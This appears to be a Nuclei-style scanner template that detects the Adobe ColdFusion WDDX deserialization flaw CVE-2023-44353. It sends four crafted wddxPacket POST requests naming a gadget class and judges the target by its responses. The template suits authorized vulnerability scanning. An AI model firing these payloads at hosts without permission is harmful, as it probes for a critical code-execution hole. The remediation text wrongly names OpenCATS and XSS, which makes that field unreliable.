http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 500 && status_code_2 == 404
    - contains(body_1, "coldfusion.runtime")
    name: windows
    type: dsl
  - condition: and
    dsl:
    - status_code_3 == 500 && status_code_4 == 404
    - contains(body_3, "coldfusion.runtime")
    name: linux
    type: dsl
  matchers-condition: or
  raw:
  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    argumentCollection=<wddxPacket+version=''1.0''><header/><data><struct+type=''acoldfusion.tagext.io.cache.CacheTaga''><var+name=''directory''><string>{{windows_known_path}}</string></var></struct></data></wddxPacket>

    '
  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    argumentCollection=<wddxPacket+version=''1.0''><header/><data><struct+type=''acoldfusion.tagext.io.cache.CacheTaga''><var+name=''directory''><string>{{windows_bad_path}}</string></var></struct></data></wddxPacket>

    '
  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    argumentCollection=<wddxPacket+version=''1.0''><header/><data><struct+type=''acoldfusion.tagext.io.cache.CacheTaga''><var+name=''directory''><string>{{linux_known_path}}</string></var></struct></data></wddxPacket>

    '
  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    argumentCollection=<wddxPacket+version=''1.0''><header/><data><struct+type=''acoldfusion.tagext.io.cache.CacheTaga''><var+name=''directory''><string>{{linux_bad_path}}</string></var></struct></data></wddxPacket>

    '
id: CVE-2023-44353
info:
  author: salts
  classification:
    cpe: cpe:2.3:a:adobe:coldfusion:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-44353
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.72579
    epss-score: 0.00456
  description: 'Adobe ColdFusion versions 2023.5 (and earlier) and 2021.11 (and earlier)
    are affected by an Deserialization of Untrusted Data vulnerability that could
    result in Arbitrary code execution. Exploitation of this issue does not require
    user interaction.

    '
  metadata:
    max-request: 4
    product: coldfusion
    shodan-query: http.component:"Adobe ColdFusion"
    vendor: adobe
    verified: true
  name: Adobe ColdFusion WDDX Deserialization Gadgets
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-44353
  - https://helpx.adobe.com/security/products/coldfusion/apsb23-52.html
  - https://research.nccgroup.com/2023/11/21/technical-advisory-adobe-coldfusion-wddx-deserialization-gadgets/#coldfusion-wddx.py
  remediation: 'To mitigate this vulnerability, it is recommended to apply the latest
    security patches or upgrade to a newer version of OpenCATS that addresses the
    XSS vulnerability.

    '
  severity: critical
  tags: cve,cve2023,adobe,coldfusion,deserialization
variables:
  linux_bad_path: /thesecretcowlevelisreal/
  linux_known_path: /etc/
  windows_bad_path: C:\Thisdefinitelydoesnotexist\
  windows_known_path: C:\Windows\
